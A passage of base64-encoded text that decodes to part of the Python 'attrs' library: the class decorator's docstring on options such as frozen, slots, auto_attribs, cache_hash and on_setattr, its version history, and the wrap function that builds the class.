BUaGlzIGlzIGFjaGlldmVkIGJ5IGluc3RhbGxpbmcgYSBjdXN0b20gYGBfX3NldGF0dHJfX2BgIG1ldGhvZFxuICAgICAgICAgICAgICAgb24geW91ciBjbGFzcywgc28geW91IGNhblwndCBpbXBsZW1lbnQgeW91ciBvd24uXG5cbiAgICAgICAgICAgIDIuIFRydWUgaW1tdXRhYmlsaXR5IGlzIGltcG9zc2libGUgaW4gUHl0aG9uLlxuXG4gICAgICAgICAgICAzLiBUaGlzICpkb2VzKiBoYXZlIGEgbWlub3IgYSBydW50aW1lIHBlcmZvcm1hbmNlIGBpbXBhY3RcbiAgICAgICAgICAgICAgIDxob3ctZnJvemVuPmAgd2hlbiBpbml0aWFsaXppbmcgbmV3IGluc3RhbmNlcy4gIEluIG90aGVyIHdvcmRzOlxuICAgICAgICAgICAgICAgYGBfX2luaXRfX2BgIGlzIHNsaWdodGx5IHNsb3dlciB3aXRoIGBgZnJvemVuPVRydWVgYC5cblxuICAgICAgICAgICAgNC4gSWYgYSBjbGFzcyBpcyBmcm96ZW4sIHlvdSBjYW5ub3QgbW9kaWZ5IGBgc2VsZmBgIGluXG4gICAgICAgICAgICAgICBgYF9fYXR0cnNfcG9zdF9pbml0X19gYCBvciBhIHNlbGYtd3JpdHRlbiBgYF9faW5pdF9fYGAuIFlvdSBjYW5cbiAgICAgICAgICAgICAgIGNpcmN1bXZlbnQgdGhhdCBsaW1pdGF0aW9uIGJ5IHVzaW5nXG4gICAgICAgICAgICAgICBgYG9iamVjdC5fX3NldGF0dHJfXyhzZWxmLCAiYXR0cmlidXRlX25hbWUiLCB2YWx1ZSlgYC5cblxuICAgICAgICAgICAgNS4gU3ViY2xhc3NlcyBvZiBhIGZyb3plbiBjbGFzcyBhcmUgZnJvemVuIHRvby5cblxuICAgIDpwYXJhbSBib29sIHdlYWtyZWZfc2xvdDogTWFrZSBpbnN0YW5jZXMgd2Vhay1yZWZlcmVuY2VhYmxlLiAgVGhpcyBoYXMgbm9cbiAgICAgICAgZWZmZWN0IHVubGVzcyBgYHNsb3RzYGAgaXMgYWxzbyBlbmFibGVkLlxuICAgIDpwYXJhbSBib29sIGF1dG9fYXR0cmliczogSWYgYGBUcnVlYGAsIGNvbGxlY3QgYFBFUCA1MjZgXy1hbm5vdGF0ZWRcbiAgICAgICAgYXR0cmlidXRlcyAoUHl0aG9uIDMuNiBhbmQgbGF0ZXIgb25seSkgZnJvbSB0aGUgY2xhc3MgYm9keS5cblxuICAgICAgICBJbiB0aGlzIGNhc2UsIHlvdSAqKm11c3QqKiBhbm5vdGF0ZSBldmVyeSBmaWVsZC4gIElmIGBgYXR0cnNgYFxuICAgICAgICBlbmNvdW50ZXJzIGEgZmllbGQgdGhhdCBpcyBzZXQgdG8gYW4gYGF0dHIuaWJgIGJ1dCBsYWNrcyBhIHR5cGVcbiAgICAgICAgYW5ub3RhdGlvbiwgYW4gYGF0dHIuZXhjZXB0aW9ucy5VbmFubm90YXRlZEF0dHJpYnV0ZUVycm9yYCBpc1xuICAgICAgICByYWlzZWQuICBVc2UgYGBmaWVsZF9uYW1lOiB0eXBpbmcuQW55ID0gYXR0ci5pYiguLi4pYGAgaWYgeW91IGRvblwndFxuICAgICAgICB3YW50IHRvIHNldCBhIHR5cGUuXG5cbiAgICAgICAgSWYgeW91IGFzc2lnbiBhIHZhbHVlIHRvIHRob3NlIGF0dHJpYnV0ZXMgKGUuZy4gYGB4OiBpbnQgPSA0MmBgKSwgdGhhdFxuICAgICAgICB2YWx1ZSBiZWNvbWVzIHRoZSBkZWZhdWx0IHZhbHVlIGxpa2UgaWYgaXQgd2VyZSBwYXNzZWQgdXNpbmdcbiAgICAgICAgYGBhdHRyLmliKGRlZmF1bHQ9NDIpYGAuICBQYXNzaW5nIGFuIGluc3RhbmNlIG9mIGBhdHRycy5GYWN0b3J5YCBhbHNvXG4gICAgICAgIHdvcmtzIGFzIGV4cGVjdGVkIGluIG1vc3QgY2FzZXMgKHNlZSB3YXJuaW5nIGJlbG93KS5cblxuICAgICAgICBBdHRyaWJ1dGVzIGFubm90YXRlZCBhcyBgdHlwaW5nLkNsYXNzVmFyYCwgYW5kIGF0dHJpYnV0ZXMgdGhhdCBhcmVcbiAgICAgICAgbmVpdGhlciBhbm5vdGF0ZWQgbm9yIHNldCB0byBhbiBgYXR0ci5pYmAgYXJlICoqaWdub3JlZCoqLlxuXG4gICAgICAgIC4uIHdhcm5pbmc6OlxuICAgICAgICAgICBGb3IgZmVhdHVyZXMgdGhhdCB1c2UgdGhlIGF0dHJpYnV0ZSBuYW1lIHRvIGNyZWF0ZSBkZWNvcmF0b3JzIChlLmcuXG4gICAgICAgICAgIGB2YWxpZGF0b3JzIDx2YWxpZGF0b3JzPmApLCB5b3Ugc3RpbGwgKm11c3QqIGFzc2lnbiBgYXR0ci5pYmAgdG9cbiAgICAgICAgICAgdGhlbS4gT3RoZXJ3aXNlIFB5dGhvbiB3aWxsIGVpdGhlciBub3QgZmluZCB0aGUgbmFtZSBvciB0cnkgdG8gdXNlXG4gICAgICAgICAgIHRoZSBkZWZhdWx0IHZhbHVlIHRvIGNhbGwgZS5nLiBgYHZhbGlkYXRvcmBgIG9uIGl0LlxuXG4gICAgICAgICAgIFRoZXNlIGVycm9ycyBjYW4gYmUgcXVpdGUgY29uZnVzaW5nIGFuZCBwcm9iYWJseSB0aGUgbW9zdCBjb21tb24gYnVnXG4gICAgICAgICAgIHJlcG9ydCBvbiBvdXIgYnVnIHRyYWNrZXIuXG5cbiAgICAgICAgLi4gX2BQRVAgNTI2YDogaHR0cHM6Ly93d3cucHl0aG9uLm9yZy9kZXYvcGVwcy9wZXAtMDUyNi9cbiAgICA6cGFyYW0gYm9vbCBrd19vbmx5OiBNYWtlIGFsbCBhdHRyaWJ1dGVzIGtleXdvcmQtb25seSAoUHl0aG9uIDMrKVxuICAgICAgICBpbiB0aGUgZ2VuZXJhdGVkIGBgX19pbml0X19gYCAoaWYgYGBpbml0YGAgaXMgYGBGYWxzZWBgLCB0aGlzXG4gICAgICAgIHBhcmFtZXRlciBpcyBpZ25vcmVkKS5cbiAgICA6cGFyYW0gYm9vbCBjYWNoZV9oYXNoOiBFbnN1cmUgdGhhdCB0aGUgb2JqZWN0XCdzIGhhc2ggY29kZSBpcyBjb21wdXRlZFxuICAgICAgICBvbmx5IG9uY2UgYW5kIHN0b3JlZCBvbiB0aGUgb2JqZWN0LiAgSWYgdGhpcyBpcyBzZXQgdG8gYGBUcnVlYGAsXG4gICAgICAgIGhhc2hpbmcgbXVzdCBiZSBlaXRoZXIgZXhwbGljaXRseSBvciBpbXBsaWNpdGx5IGVuYWJsZWQgZm9yIHRoaXNcbiAgICAgICAgY2xhc3MuICBJZiB0aGUgaGFzaCBjb2RlIGlzIGNhY2hlZCwgYXZvaWQgYW55IHJlYXNzaWdubWVudHMgb2ZcbiAgICAgICAgZmllbGRzIGludm9sdmVkIGluIGhhc2ggY29kZSBjb21wdXRhdGlvbiBvciBtdXRhdGlvbnMgb2YgdGhlIG9iamVjdHNcbiAgICAgICAgdGhvc2UgZmllbGRzIHBvaW50IHRvIGFmdGVyIG9iamVjdCBjcmVhdGlvbi4gIElmIHN1Y2ggY2hhbmdlcyBvY2N1cixcbiAgICAgICAgdGhlIGJlaGF2aW9yIG9mIHRoZSBvYmplY3RcJ3MgaGFzaCBjb2RlIGlzIHVuZGVmaW5lZC5cbiAgICA6cGFyYW0gYm9vbCBhdXRvX2V4YzogSWYgdGhlIGNsYXNzIHN1YmNsYXNzZXMgYEJhc2VFeGNlcHRpb25gXG4gICAgICAgICh3aGljaCBpbXBsaWNpdGx5IGluY2x1ZGVzIGFueSBzdWJjbGFzcyBvZiBhbnkgZXhjZXB0aW9uKSwgdGhlXG4gICAgICAgIGZvbGxvd2luZyBoYXBwZW5zIHRvIGJlaGF2ZSBsaWtlIGEgd2VsbC1iZWhhdmVkIFB5dGhvbiBleGNlcHRpb25zXG4gICAgICAgIGNsYXNzOlxuXG4gICAgICAgIC0gdGhlIHZhbHVlcyBmb3IgKmVxKiwgKm9yZGVyKiwgYW5kICpoYXNoKiBhcmUgaWdub3JlZCBhbmQgdGhlXG4gICAgICAgICAgaW5zdGFuY2VzIGNvbXBhcmUgYW5kIGhhc2ggYnkgdGhlIGluc3RhbmNlXCdzIGlkcyAoTi5CLiBgYGF0dHJzYGAgd2lsbFxuICAgICAgICAgICpub3QqIHJlbW92ZSBleGlzdGluZyBpbXBsZW1lbnRhdGlvbnMgb2YgYGBfX2hhc2hfX2BgIG9yIHRoZSBlcXVhbGl0eVxuICAgICAgICAgIG1ldGhvZHMuIEl0IGp1c3Qgd29uXCd0IGFkZCBvd24gb25lcy4pLFxuICAgICAgICAtIGFsbCBhdHRyaWJ1dGVzIHRoYXQgYXJlIGVpdGhlciBwYXNzZWQgaW50byBgYF9faW5pdF9fYGAgb3IgaGF2ZSBhXG4gICAgICAgICAgZGVmYXVsdCB2YWx1ZSBhcmUgYWRkaXRpb25hbGx5IGF2YWlsYWJsZSBhcyBhIHR1cGxlIGluIHRoZSBgYGFyZ3NgYFxuICAgICAgICAgIGF0dHJpYnV0ZSxcbiAgICAgICAgLSB0aGUgdmFsdWUgb2YgKnN0ciogaXMgaWdub3JlZCBsZWF2aW5nIGBgX19zdHJfX2BgIHRvIGJhc2UgY2xhc3Nlcy5cbiAgICA6cGFyYW0gYm9vbCBjb2xsZWN0X2J5X21ybzogU2V0dGluZyB0aGlzIHRvIGBUcnVlYCBmaXhlcyB0aGUgd2F5IGBgYXR0cnNgYFxuICAgICAgIGNvbGxlY3RzIGF0dHJpYnV0ZXMgZnJvbSBiYXNlIGNsYXNzZXMuICBUaGUgZGVmYXVsdCBiZWhhdmlvciBpc1xuICAgICAgIGluY29ycmVjdCBpbiBjZXJ0YWluIGNhc2VzIG9mIG11bHRpcGxlIGluaGVyaXRhbmNlLiAgSXQgc2hvdWxkIGJlIG9uIGJ5XG4gICAgICAgZGVmYXVsdCBidXQgaXMga2VwdCBvZmYgZm9yIGJhY2t3YXJkLWNvbXBhdGliaWxpdHkuXG5cbiAgICAgICBTZWUgaXNzdWUgYCM0MjggPGh0dHBzOi8vZ2l0aHViLmNvbS9weXRob24tYXR0cnMvYXR0cnMvaXNzdWVzLzQyOD5gXyBmb3JcbiAgICAgICBtb3JlIGRldGFpbHMuXG5cbiAgICA6cGFyYW0gT3B0aW9uYWxbYm9vbF0gZ2V0c3RhdGVfc2V0c3RhdGU6XG4gICAgICAgLi4gbm90ZTo6XG4gICAgICAgICAgVGhpcyBpcyB1c3VhbGx5IG9ubHkgaW50ZXJlc3RpbmcgZm9yIHNsb3R0ZWQgY2xhc3NlcyBhbmQgeW91IHNob3VsZFxuICAgICAgICAgIHByb2JhYmx5IGp1c3Qgc2V0ICphdXRvX2RldGVjdCogdG8gYFRydWVgLlxuXG4gICAgICAgSWYgYFRydWVgLCBgYF9fZ2V0c3RhdGVfX2BgIGFuZFxuICAgICAgIGBgX19zZXRzdGF0ZV9fYGAgYXJlIGdlbmVyYXRlZCBhbmQgYXR0YWNoZWQgdG8gdGhlIGNsYXNzLiBUaGlzIGlzXG4gICAgICAgbmVjZXNzYXJ5IGZvciBzbG90dGVkIGNsYXNzZXMgdG8gYmUgcGlja2xlYWJsZS4gSWYgbGVmdCBgTm9uZWAsIGl0XCdzXG4gICAgICAgYFRydWVgIGJ5IGRlZmF1bHQgZm9yIHNsb3R0ZWQgY2xhc3NlcyBhbmQgYGBGYWxzZWBgIGZvciBkaWN0IGNsYXNzZXMuXG5cbiAgICAgICBJZiAqYXV0b19kZXRlY3QqIGlzIGBUcnVlYCwgYW5kICpnZXRzdGF0ZV9zZXRzdGF0ZSogaXMgbGVmdCBgTm9uZWAsXG4gICAgICAgYW5kICoqZWl0aGVyKiogYGBfX2dldHN0YXRlX19gYCBvciBgYF9fc2V0c3RhdGVfX2BgIGlzIGRldGVjdGVkIGRpcmVjdGx5XG4gICAgICAgb24gdGhlIGNsYXNzIChpLmUuIG5vdCBpbmhlcml0ZWQpLCBpdCBpcyBzZXQgdG8gYEZhbHNlYCAodGhpcyBpcyB1c3VhbGx5XG4gICAgICAgd2hhdCB5b3Ugd2FudCkuXG5cbiAgICA6cGFyYW0gb25fc2V0YXR0cjogQSBjYWxsYWJsZSB0aGF0IGlzIHJ1biB3aGVuZXZlciB0aGUgdXNlciBhdHRlbXB0cyB0byBzZXRcbiAgICAgICAgYW4gYXR0cmlidXRlIChlaXRoZXIgYnkgYXNzaWdubWVudCBsaWtlIGBgaS54ID0gNDJgYCBvciBieSB1c2luZ1xuICAgICAgICBgc2V0YXR0cmAgbGlrZSBgYHNldGF0dHIoaSwgIngiLCA0MilgYCkuIEl0IHJlY2VpdmVzIHRoZSBzYW1lIGFyZ3VtZW50c1xuICAgICAgICBhcyB2YWxpZGF0b3JzOiB0aGUgaW5zdGFuY2UsIHRoZSBhdHRyaWJ1dGUgdGhhdCBpcyBiZWluZyBtb2RpZmllZCwgYW5kXG4gICAgICAgIHRoZSBuZXcgdmFsdWUuXG5cbiAgICAgICAgSWYgbm8gZXhjZXB0aW9uIGlzIHJhaXNlZCwgdGhlIGF0dHJpYnV0ZSBpcyBzZXQgdG8gdGhlIHJldHVybiB2YWx1ZSBvZlxuICAgICAgICB0aGUgY2FsbGFibGUuXG5cbiAgICAgICAgSWYgYSBsaXN0IG9mIGNhbGxhYmxlcyBpcyBwYXNzZWQsIHRoZXlcJ3JlIGF1dG9tYXRpY2FsbHkgd3JhcHBlZCBpbiBhblxuICAgICAgICBgYXR0cnMuc2V0dGVycy5waXBlYC5cblxuICAgIDpwYXJhbSBPcHRpb25hbFtjYWxsYWJsZV0gZmllbGRfdHJhbnNmb3JtZXI6XG4gICAgICAgIEEgZnVuY3Rpb24gdGhhdCBpcyBjYWxsZWQgd2l0aCB0aGUgb3JpZ2luYWwgY2xhc3Mgb2JqZWN0IGFuZCBhbGxcbiAgICAgICAgZmllbGRzIHJpZ2h0IGJlZm9yZSBgYGF0dHJzYGAgZmluYWxpemVzIHRoZSBjbGFzcy4gIFlvdSBjYW4gdXNlXG4gICAgICAgIHRoaXMsIGUuZy4sIHRvIGF1dG9tYXRpY2FsbHkgYWRkIGNvbnZlcnRlcnMgb3IgdmFsaWRhdG9ycyB0b1xuICAgICAgICBmaWVsZHMgYmFzZWQgb24gdGhlaXIgdHlwZXMuICBTZWUgYHRyYW5zZm9ybS1maWVsZHNgIGZvciBtb3JlIGRldGFpbHMuXG5cbiAgICA6cGFyYW0gYm9vbCBtYXRjaF9hcmdzOlxuICAgICAgICBJZiBgVHJ1ZWAgKGRlZmF1bHQpLCBzZXQgYGBfX21hdGNoX2FyZ3NfX2BgIG9uIHRoZSBjbGFzcyB0byBzdXBwb3J0XG4gICAgICAgIGBQRVAgNjM0IDxodHRwczovL3d3dy5weXRob24ub3JnL2Rldi9wZXBzL3BlcC0wNjM0Lz5gXyAoU3RydWN0dXJhbFxuICAgICAgICBQYXR0ZXJuIE1hdGNoaW5nKS4gSXQgaXMgYSB0dXBsZSBvZiBhbGwgcG9zaXRpb25hbC1vbmx5IGBgX19pbml0X19gYFxuICAgICAgICBwYXJhbWV0ZXIgbmFtZXMgb24gUHl0aG9uIDMuMTAgYW5kIGxhdGVyLiBJZ25vcmVkIG9uIG9sZGVyIFB5dGhvblxuICAgICAgICB2ZXJzaW9ucy5cblxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE2LjAuMCAqc2xvdHMqXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTYuMS4wICpmcm96ZW4qXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTYuMy4wICpzdHIqXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTYuMy4wIFN1cHBvcnQgZm9yIGBgX19hdHRyc19wb3N0X2luaXRfX2BgLlxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMTcuMS4wXG4gICAgICAgKmhhc2gqIHN1cHBvcnRzIGBgTm9uZWBgIGFzIHZhbHVlIHdoaWNoIGlzIGFsc28gdGhlIGRlZmF1bHQgbm93LlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE3LjMuMCAqYXV0b19hdHRyaWJzKlxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMTguMS4wXG4gICAgICAgSWYgKnRoZXNlKiBpcyBwYXNzZWQsIG5vIGF0dHJpYnV0ZXMgYXJlIGRlbGV0ZWQgZnJvbSB0aGUgY2xhc3MgYm9keS5cbiAgICAuLiB2ZXJzaW9uY2hhbmdlZDo6IDE4LjEuMCBJZiAqdGhlc2UqIGlzIG9yZGVyZWQsIHRoZSBvcmRlciBpcyByZXRhaW5lZC5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxOC4yLjAgKndlYWtyZWZfc2xvdCpcbiAgICAuLiBkZXByZWNhdGVkOjogMTguMi4wXG4gICAgICAgYGBfX2x0X19gYCwgYGBfX2xlX19gYCwgYGBfX2d0X19gYCwgYW5kIGBgX19nZV9fYGAgbm93IHJhaXNlIGFcbiAgICAgICBgRGVwcmVjYXRpb25XYXJuaW5nYCBpZiB0aGUgY2xhc3NlcyBjb21wYXJlZCBhcmUgc3ViY2xhc3NlcyBvZlxuICAgICAgIGVhY2ggb3RoZXIuIGBgX19lcWBgIGFuZCBgYF9fbmVfX2BgIG5ldmVyIHRyaWVkIHRvIGNvbXBhcmVkIHN1YmNsYXNzZXNcbiAgICAgICB0byBlYWNoIG90aGVyLlxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMTkuMi4wXG4gICAgICAgYGBfX2x0X19gYCwgYGBfX2xlX19gYCwgYGBfX2d0X19gYCwgYW5kIGBgX19nZV9fYGAgbm93IGRvIG5vdCBjb25zaWRlclxuICAgICAgIHN1YmNsYXNzZXMgY29tcGFyYWJsZSBhbnltb3JlLlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDE4LjIuMCAqa3dfb25seSpcbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxOC4yLjAgKmNhY2hlX2hhc2gqXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMTkuMS4wICphdXRvX2V4YypcbiAgICAuLiBkZXByZWNhdGVkOjogMTkuMi4wICpjbXAqIFJlbW92YWwgb24gb3IgYWZ0ZXIgMjAyMS0wNi0wMS5cbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAxOS4yLjAgKmVxKiBhbmQgKm9yZGVyKlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjEuMCAqYXV0b19kZXRlY3QqXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjAuMS4wICpjb2xsZWN0X2J5X21ybypcbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMC4xLjAgKmdldHN0YXRlX3NldHN0YXRlKlxuICAgIC4uIHZlcnNpb25hZGRlZDo6IDIwLjEuMCAqb25fc2V0YXR0cipcbiAgICAuLiB2ZXJzaW9uYWRkZWQ6OiAyMC4zLjAgKmZpZWxkX3RyYW5zZm9ybWVyKlxuICAgIC4uIHZlcnNpb25jaGFuZ2VkOjogMjEuMS4wXG4gICAgICAgYGBpbml0PUZhbHNlYGAgaW5qZWN0cyBgYF9fYXR0cnNfaW5pdF9fYGBcbiAgICAuLiB2ZXJzaW9uY2hhbmdlZDo6IDIxLjEuMCBTdXBwb3J0IGZvciBgYF9fYXR0cnNfcHJlX2luaXRfX2BgXG4gICAgLi4gdmVyc2lvbmNoYW5nZWQ6OiAyMS4xLjAgKmNtcCogdW5kZXByZWNhdGVkXG4gICAgLi4gdmVyc2lvbmFkZGVkOjogMjEuMy4wICptYXRjaF9hcmdzKlxuICAgICIiIlxuICAgIGlmIGF1dG9fZGV0ZWN0IGFuZCBQWTI6XG4gICAgICAgIHJhaXNlIFB5dGhvblRvb09sZEVycm9yKFxuICAgICAgICAgICAgImF1dG9fZGV0ZWN0IG9ubHkgd29ya3Mgb24gUHl0aG9uIDMgYW5kIGxhdGVyLiJcbiAgICAgICAgKVxuXG4gICAgZXFfLCBvcmRlcl8gPSBfZGV0ZXJtaW5lX2F0dHJzX2VxX29yZGVyKGNtcCwgZXEsIG9yZGVyLCBOb25lKVxuICAgIGhhc2hfID0gaGFzaCAgIyB3b3JrIGFyb3VuZCB0aGUgbGFjayBvZiBub25sb2NhbFxuXG4gICAgaWYgaXNpbnN0YW5jZShvbl9zZXRhdHRyLCAobGlzdCwgdHVwbGUpKTpcbiAgICAgICAgb25fc2V0YXR0ciA9IHNldHRlcnMucGlwZSgqb25fc2V0YXR0cilcblxuICAgIGRlZiB3cmFwKGNscyk6XG5cbiAgICAgICAgaWYgZ2V0YXR0cihjbHMsICJfX2NsYXNzX18iLCBOb25lKSBpcyBOb25lOlxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJhdHRycyBvbmx5IHdvcmtzIHdpdGggbmV3LXN0eWxlIGNsYXNzZXMuIilcblxuICAgICAgICBpc19mcm96ZW4gPSBmcm96ZW4gb3IgX2hhc19mcm96ZW5fYmFzZV9jbGFzcyhjbHMpXG4gICAgICAgIGlzX2V4YyA9IGF1dG9fZXhjIGlzIFRydWUgYW5kIGlzc3ViY2xhc3MoY2xzLCBCYXNlRXhjZXB0aW9uKVxuICAgICAgICBoYXNfb3duX3NldGF0dHIgPSBhdXRvX2RldGVjdCBhbmQgX2hhc19vd25fYXR0cmlidXRlKFxuICAgICAgICAgICAgY2xzLCAiX19zZXRhdHRyX18iXG4gICAgICAgIClcblxuICAgICAgICBpZiBoYXNfb3duX3NldGF0dHIgYW5kIGlzX2Zyb3plbjpcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkNhblwndCBmcmVlemUgYSBjbGFzcyB3aXRoIGEgY3VzdG9tIF9fc2V0YXR0cl9fLiIpXG5cbiAgICAgICAgYnVpbGRlciA9IF9DbGFzc0J1aWxkZXIoXG4gICAgICAgICAgICBjbHMsXG4gICAgICAgICAgICB0aGVzZSxcbiAgICAgICAgICAgIHNsb3RzLFxuICAgICAgICAgICAgaXNfZnJvemVuLFxuICAgICAgICAgICAgd2Vha3JlZl9zbG90LFxuICAgICAgICAgICAgX2RldGVybWluZV93aGV0aGVyX3RvX2ltcGxlbWVudChcbiAgICAgICAgICAgICAgICBjbHMsXG4gICAgICAgICAgICAgICAgZ2V0c3RhdGVfc2V0c3RhdGUsXG4gICAgICAgICAgICAgICAgYXV0b19kZXRlY3QsXG4gICAgICAgICAgICAgICAgKCJfX2dldHN0YXRlX18iLCAiX19zZXRzdGF0ZV9fIiksXG4gICAgICAgICAgICAgICAgZGVmYXVsdD1zbG90cyxcbiAgICAgICAgICAgICksXG4gICAgICAgICAgICBhdXRvX2F0dHJpYnMsXG4gICAgICAgICAgICBrd19vbmx5LFxuICAgICAgICAgICAgY2FjaGVfaGFzaCxcbiAgICAgICAgICAgIGlzX2V4YyxcbiAgICAgICAgICAgIGNvbGxlY3RfYnlfbXJvLFxuICAgICAgICAgICAgb25fc2V0YXR0cixcbiAgICAgICAgICAgIGhhc19vd25fc2V0YXR0cixcbiAgICAgICAgICAgIGZpZWxkX3RyYW5zZm9ybWVyLFxuICAgICAgICApXG4gICAgICAgIGlmIF9kZXRlcm1pbmVfd2hldGhlcl90b19pbXBsZW1lbnQoXG4gICAgICAgICAgICBjbHMsIHJlcHIsIGF1dG9fZGV0ZWN0LCAoIl9fcmVwcl9fIiwpXG4gICAgICAgICk6XG4gICAgICAgICAgICBidWlsZGVyLmFkZF9yZXByKHJlcHJfbnMpXG4gICAgICAgIGlmIHN0ciBpcyBUcnVlOlxuICAgICAgICAgICAgYnVpbGRlci5hZGRfc3RyKClcblxuICAgICAgICBlcSA9IF9kZXRlcm1pbmVfd2hldGhlcl90b19pbXBsZW1lbnQoXG4gICAgICAgICAgICBjbHMsIGVxXywgYXV0b19kZXRlY3QsICgiX19lcV9fIiwgIl9fbmVfXyIpXG4gICAgICAgIClcbiAgICAgICAgaWYgbm90IGlzX2V4YyBhbmQgZXEgaXMgVHJ1ZTpcbiAgICAgICAgICAgIGJ1aWxkZXIuYWRkX2VxKClcbiAgICAgICAgaWYgbm90IGlzX2V4YyBhbmQgX2RldGVybWluZV93aGV0aGVyX3RvX2ltcGxlbWVudChcbiAgICAgICAgICAgIGNscywgb3JkZXJfLCBhdXRvX2RldGVjdCwgKCJfX2x0X18iLCAiX19sZV9fIiwgIl9fZ3RfXyIsICJfX2dlX18iKVxuICAgICAgICApOlxuICAgICAgICAgICAgYnVpbGRlci5hZGRfb3JkZXIoKVxuXG4gICAgICAgIGJ1aWxkZXIuYWRkX3NldGF0dHIoKVxuXG4gICAgICAgIGlmIChcbiAgICAgICAgICAgIGhhc2hfIGlzIE5vbmVcbiAgICAgICAgICAgIGFuZCBhdXRvX2RldGVjdCBpcyBUcnVlXG4gICAgICAgICAgICBhbmQgX2hhc19vd25fYXR0cmlidXRlKGNscywgIl9faGFzaF9fIilcbiAgICAgICAgKTpcbiAgICAgICAgICAgIGhhc2ggPSBGYWxzZVxuICAgICAgICBlbHNlOlxuICAgICAgICAgICAgaGFzaCA9IGhhc2hfXG4gICAgICAgIGlmIGhhc2ggaXMgbm90IFRydWUgYW5kIGhhc2ggaXMgbm90IEZhbHNlIGFuZCBoYXNoIGlzIG5vdCBOb25lOlxuICAgICAgICAgICAgIyBDYW5cJ3QgdXNlIGBoYXNoIGluYCBiZWNhdXNlIDEgPT0gVHJ1ZSBmb3IgZXhhbXBsZS5cbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcbiAgICAgICAgICAgICAgICAiSW52YWxpZCB2YWx1ZSBmb3IgaGFzaC4gIE11c3QgYmUgVHJ1ZSwgRmFsc2UsIG9yIE5vbmUuIlxuICAgICAgICAgICAgKVxuICAgICAgICBlbGlmIGhhc2ggaXMgRmFsc2Ugb3IgKGhhc2ggaXMgTm9uZSBhbmQgZXEgaXMgRmFsc2UpIG9yIGlzX2V4YzpcbiAgICAgICAgICAgICMgRG9uXCd0IGRvIGFueXRoaW5nLiBTaG91bGQgZmFsbCBiYWNrIHRvIF9fb2JqZWN0X19cJ3MgX19oYXNoX19cbiAgICAgICAgICAgICMgd2hpY2ggaXMgYnkgaWQuXG4gICAgICAgICAgICBpZiBjYWNoZV9oYXNoOlxuICAgICAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcbiAgICAgICAgICAgICAgICAgICAgIkludmFsaWQgdmFsdWUgZm9yIGNhY2hlX2hhc2guICBUbyB1c2UgaGFzaCBjYWNoaW5nLCJcbiAgICAgICAgICAgICAgICAgICAgIiBoYXNoaW5nIG11c3QgYmUgZWl0aGVyIGV4cGxpY2l0bHkgb3IgaW1wbGljaXRseSAiXG4gICAgICAgICAgICAgICAgICAgICJlbmFibGVkLiJcbiAgICAgICAgICAgICAgICApXG4gICAgICAgIGVsaWYgaGFzaCBpcyBUcnVlIG9yIChcbiAgICAgICAgICAgIGhhc2ggaXMgTm9uZSBhbmQgZXEgaXMgVHJ1ZSBhbmQgaXNfZnJvemVuIGlzIFRydWVcbiAgICAgICAgKTpcbiAgICAgICAgICAgICMgQnVpbGQgYSBfX2hhc2hfXyBpZiB0b2xkIHNvLCBvciBpZiBpdFwncyBzYWZlLlxuICAgICAgICAgICAgYnVpbGRlci5hZGRfaGFzaCgpXG4gICAgICAgIGVsc2U6XG4gICAgICAgICAgICAjIFJhaXNlIFR5cGVFcnJvciBvbiBhdHRlbXB0cyB0byBoYXNoLlxuICAgICAgICAgICAgaWYgY2FjaGVfaGFzaDpcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgICAgICJJbnZhbGlkIHZhbHVlIGZvciBjYWNoZV9oYXNoLiAgVG8gdXNlIGhhc2ggY2FjaGluZywiXG4gICAgICAgICAgICAgICAgICAgICIgaGFzaGluZyBtdXN0IGJlIGVpdGhlciBleHBsaWNpdGx5IG9yIGltcGxpY2l0bHkgIlxuICAgICAgICAgICAgICAgICAgICAiZW5hYmxlZC4iXG4gICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgYnVpbGRlci5tYWtlX3VuaGFzaGFibGUoKVxuXG4gICAgICAgIGlmIF9kZXRlcm1pbmVfd2hldGhlcl90b19pbXBsZW1lbnQoXG4gICAgICAgICAgICBjbHMsIGluaXQsIGF1dG9fZGV0ZWN0LCAoIl9faW5pdF9fIiwpXG4gICAgICAgICk6XG4gICAgICAgICAgICBidWlsZGVyLmFkZF9pbml0KClcbiAgICAgICAgZWxzZTpcbiAgICAgICAgICAgIGJ1aWxkZXIuYWRkX2F0dHJzX2luaXQoKVxuICAgICAgICAgICAgaWYgY2FjaGVfaGFzaDpcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoXG4gICAgICAgICAgICAgICAgICAgICJJbnZhbGlkIHZhbHVlIGZvciBjYWNoZV9oYXNoLiAgVG8gdXNlIGhhc2ggY2FjaGluZywiXG4gICAgICAgICAgICAgICAgICAgICIgaW5pdCBtdXN0IGJlIFRydWUuIlxuICAgICAgICAgICAgICAgIClcblxuICAgICAgICBpZiAoXG4gICAgICAgICAgICBQWTMxMFxuICAgICAgICAgICAgYW5kIG1hdGNoX2FyZ3NcbiAgICAgICAgICAgIGFuZCBub3QgX2hhc19vd25fYXR0cmlidXRlKGNscywgIl9fbWF0Y2hfYXJnc19fIilcbiAgICAgICAgKTpcbiAgICAgICAgICAgIGJ1aWxkZXIuYWRkX21hdGNoX2FyZ3MoKVxuXG4gICAgICAgIHJldHVybiBidWlsZGVyLmJ1aWxkX2NsYXNzKClcblxuICAgICMgbWF5YmVfY2xzXCdzIHR5cGU